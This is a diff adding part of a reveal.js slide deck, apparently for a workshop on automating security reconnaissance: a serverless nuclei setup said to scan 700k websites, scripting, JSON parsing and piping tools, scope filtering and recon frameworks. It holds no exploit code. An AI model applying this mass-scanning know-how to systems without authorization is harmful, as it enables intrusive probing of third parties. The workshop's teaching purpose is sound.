+							<li>Wiki a bit outdated but the following should work:</li>
+                        </ul>
+						<pre><code># build your container
+lithops runtime build sc-runtime -f Dockerfile
+
+# deploy it with 512Mb memory and 300sec timeout
+lithops runtime deploy --memory 512 --timeout 300 sc-runtime</code></pre>
+						<p>What to expect:</p>
+						<ul>
+                            <li style="font-size: 0.7em;">1m 40s to nuclei scan 700k websites against a single template</a></li>
+							<li style="font-size: 0.7em;">10m to map technologies for 700k websites</a></li>
+						</ul>
+					</section>
+				</section>
+				<section>
+					<h2>Automation</h2>
+					<section>
+						<h4>stitching it together</h4>
+						<img src="automation.gif" />
+					</section>
+					<section>
+                        <h4>Scripting</h4>
+                        <p style="font-size: 0.7em;">To allow easy extension and iterative automation build-up is to use either Python or shell scripting (for the shell of your choice).</p>
+                        <ul>
+                            <li style="font-size: 0.7em;">Benefits of 🐍
+                                <ul>
+                                    <li>Ability to act immediately on results, "event" based</li>
+                                    <li>Easy to filter results within the flow</li>
+                                    <li>Have more control without extensive knowledge of dark magic</li>
+                                    <li>Control of (potentially) parallel jobs</li>
+                                </ul>
+                            </li>
+                            <li style="font-size: 0.7em;">Benefits of 🐚
+                                <ul>
+                                    <li>Get going extremely fast</li>
+                                    <li>A lot of readily made FOSS tools on your disposal</li>
+                                    <li>Easy to scale even further with frameworks like Axiom</li>
+                                </ul>
+                            </li>
+                        </ul>
+                    </section>
+                    <section>
+                        <h4>Parsing</h4>
+                        <p style="font-size: 0.7em;">JSON is made to be read by computers, and it's your best ally. Most of the tools support it in one way or another. In general you'll be dealing with either newline separated text files, or JSON.</p>
+                        <ul>
+                            <li>Python supports JSON natively</li>
+                            <li><a href="https://github.com/stedolan/jq">jq</a> is a awesome CLI tool for JSON parsing / filtering</li>
+                            <li>You can grep JSON using <a href="https://github.com/tomnomnom/gron">gron</a></li>
+                            <li>Cherrypick specific parts of urls with <a href="https://github.com/tomnomnom/unfurl">unfurl</a></li>
+                        </ul>
+                    </section>
+                    <section>
+                        <h4>Piping</h4>
+                        <p style="font-size: 0.7em;">Many different stages in the automation pipeline can branch in to multiple subtasks, so it's often good to store results from previous stages to a temporary file. This often helps you to debug possible issues as well.</p>
+                        <ul>
+                            <li>Use <a href="https://man7.org/linux/man-pages/man1/tee.1.html">tee</a> to append stdout to a file while also displaying it</li>
+                            <li><a href="https://github.com/tomnomnom/anew">anew</a> adds only new unique lines to the output file</li>
+                        </ul>
+                    </section>
+                    <section>
+                        <h4>Filtering</h4>
+                        <p style="font-size: 0.7em;">Try to avoid creating unnecessary traffic, and especially spinning out of scope that can happen quite easily. Make sure to filter out unwanted entries from your automation workflow in an early stage. This will make your automation faster, and will cause considerably less legal issues down the road ;)</p>
+                        <p style="font-size: 0.7em;">An example of a simple python script that reads lines from stdin (intended to be used within a pipe) and outputting only http(s) urls within scope can be found <a href="https://github.com/disobeyrecon23/workshop/blob/master/inscope_http.py">here</a></p>
+                    </section>
+					<section>
+                        <h4>Frameworks</h4>
+                        <p style="font-size: 0.7em;">Set of tools and techniques with the purpose of automating the whole recon process, providing a customizable (or not) workflow to achieve the goal</p>
+						<ul>
+                            <li><a href="https://github.com/smicallef/spiderfoot">reNgine</a>: web ui, Python, Docker based, Postgres DB, yaml based workflows, predefined templates + custom</li>
+							<li><a href="https://github.com/epi052/recon-pipeline">recon-pipeline</a>: cli based, Python, sqlite DB, closed toolset, pre-defined pipelines (scans) and customs</li>
+                            <li><a href="https://github.com/six2dez/reconftw">reconFTW</a>: cli based not ui (<a href="https://www.youtube.com/watch?v=rsIj7bFx4dk">yet</a>), text files, closed workflow and toolset, customizable, Docker, Terraform, axiom integration</li>
+                        </ul>
+                    </section>
+				</section>
+				<section>
+					<h2>Practical application</h2>
+					<section>
+						<img src="https://media.giphy.com/media/3oKIPwoeGErMmaI43S/giphy.gif" width="50%" height="auto"/>
+					</section>
+					<section>
+                        <h4>Custom attack surface mapping solution</h4>
+                    </section>
+					<section>
+                        <h4>Pre engagement pentest process</h4>
+                    </section>
+					<section>
+                        <h4>Bug bounty</h4>
+                    </section>
+				</section>
+			</div>
+		</div>
+		<script src="dist/reveal.js"></script>
+		<script src="plugin/zoom/zoom.js"></script>
+		<script src="plugin/notes/notes.js"></script>
+		<script src="plugin/search/search.js"></script>
+		<script src="plugin/markdown/markdown.js"></script>
+		<script src="plugin/highlight/highlight.js"></script>
+		<script>
+
+			// Also available as an ES module, see:
+			// https://revealjs.com/initialization/
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				center: true,
+				hash: true,
+
+				// Learn about plugins: https://revealjs.com/plugins/
+				plugins: [ RevealZoom, RevealNotes, RevealSearch, RevealMarkdown, RevealHighlight ]
+			});
+
+		</script>
+
+	</body>
+</html>
